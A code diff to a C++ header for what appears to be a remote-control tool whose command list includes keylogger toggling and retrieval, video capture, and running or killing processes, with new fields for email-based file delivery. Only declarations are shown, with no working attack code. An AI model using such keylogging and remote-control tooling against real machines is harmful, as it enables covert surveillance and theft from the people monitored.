@@ -16,7 +16,7 @@ public:
           GET_VIDEO,
           TOGGLE_KEYLOGGER,
           GET_KEYLOGGER,
-          GET_RUNNING_PROCESSS,
+          GET_RUNNING_PROCESS,
           RUN_PROCESS, //RUN_PROCESS name
           SHUTDOWN_PROCESS, //SHUTDOWN_PROCESS name
           SLEEP,
@@ -32,14 +32,18 @@ public:
   struct addrinfo hints{}, *res = nullptr;
 
   std::string command;
+  bool fromEmail=0;
+  std::string receiver;
+  std::string filename;
 
   const char *PORT = "27015";
   const int BUFSIZE = 512;
 
-  void Init(std::string hostIP, std::string port);
+  bool Init(std::string hostIP, std::string port);
   void GetCommand();
   void SendCommand();
-  // void sendFile(std::string pathFile);
+  void sendFile(std::string pathFile);
+  void ProcessCommand();
   void ReceiveFile(std::string pathFolder);
   void Shutdown();
 };
